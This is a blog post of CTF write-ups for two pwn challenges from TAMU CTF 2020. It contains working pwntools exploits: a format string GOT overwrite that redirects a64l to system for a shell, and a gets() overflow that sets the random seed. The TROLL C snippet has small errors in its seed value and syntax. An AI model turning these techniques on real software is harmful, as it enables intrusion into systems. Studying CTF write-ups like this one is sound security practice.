---
title: TAMU CTF 2020 - Pwn Writeups
summary:
date: "2020-03-30T00:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---

## **B64DECODER (244pts)** ##

![TASK](https://imgur.com/ZVHG4PA.png)

This is wont be a detailed writeup , however in this task we have a clear format string vulnerability (line 23) and a leak of a64l function address 

![TASK](https://imgur.com/EIv7uYX.png)

The idea is to overwrite the GOT entry of a64l function with the address of system in libc (not system@plt) using the format string vulnerability , it's also a partial overwrite because we have a limited length of input (32 characters) and using the leaked address of a64l we can easily know the address of system function , here is my exploit :

```python
from pwn import *
import struct
import sys
def pad(str):
        return str+"X"*(32-len(str))
payload=""
#p=process("./b64decoder")
p=remote("challenges.tamuctf.com",2783)
d=p.recvuntil("name!")
A64Ladd=d[:-18][-10:]
TOWRITE="0x"+A64Ladd[-4:]
sys=int(TOWRITE,16)-1680-4  #A64l-0x690
log.info(TOWRITE)
log.info(sys)
A64L_PLT=0x804b398
a64lADD=p32(A64L_PLT)
payload+=a64lADD
payload+="%"+str(sys)+"x%71$hn"
log.info("payload crafted")
p.sendline(payload)
log.info("Sent , Haaaw el shell")
p.interactive()

```
And Bingo we got our shell :D

![TASK](https://imgur.com/jd78uIm.png)

** NOTE: ** Task files ** [HERE](https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/B64DECODER) **

## **TROLL (50pts)** ##

![TASK](https://imgur.com/AgJ7rGR.png)

In this task we are supposed to win a game by guessing the next 100 random numbers , looking at the source code we can see the vulnerable gets function , after that we are setting the seed
value to the time and finally the beginning of the loop and generating the random numbers and questions each time .

![MAIN](https://imgur.com/AApFQgK.png)

My idea was to overwrite the seed value with our own value than BINGO we can generate the next random numbers and win the game , i have done things manually , i entered a unique seaquence and than observed with gdb if i have overwritten where the seed value is stored 

My input :
> AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

![TASK](https://imgur.com/XqjEzZQ.png)

I have entered a sequence of alphabet characters and stopped in the call of srand function , you can see te RDI register(where the 1st argument passed to a function is stored)  hold the value of "MMMM"
so if we replace "MMMM" with the value we want , this value will be the seed for the random numbers.

I have written this little C program to generate 100 random numbers using our chosen seed and stored them in a file :
```c
#include<stdlib.h>
#include<stdio.h>
#include<time.h>

int main(int argc, char *argv[]){
    int i=0;
int seed=3472328296227680305    //0x1000 in decimal
srand(seed);
for(i=0;i<=99;i++){
    int a=rand()% 100000 + 1;
    printf("%d\n",a);  
} 
 return 0;
}
```

After that i have written this exploit to overwrite the seed value with 0x1000 and answer the questions using the numbers we have generated 

```python
from pwn import *
#p=process("./troll")
p=remote("challenges.tamuctf.com",4765)
p.recvuntil("Who goes there?")
SEED="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP1000"
p.sendline(SEED)
log.info("Sent First payload")
answers=open("answer","r")
for line in answers:
        p.recvuntil("What is it?")
        log.info("sending answer: "+line)
        p.sendline(line)
p.interactive()

```
Note: the offset in the remote server is different, so i had to guess it xD However we got our flag : 

![MAIN](https://imgur.com/QjwTHDR.png)

** NOTE: ** Task files ** [HERE](https://github.com/kahla-sec/CTF-Writeups/tree/master/TAMU%20CTF/TROLL) **

This is the first time writing a pwn writeup so i hope you enjoyed it , any questions you can find me on twitter @BelkahlaAhmed1

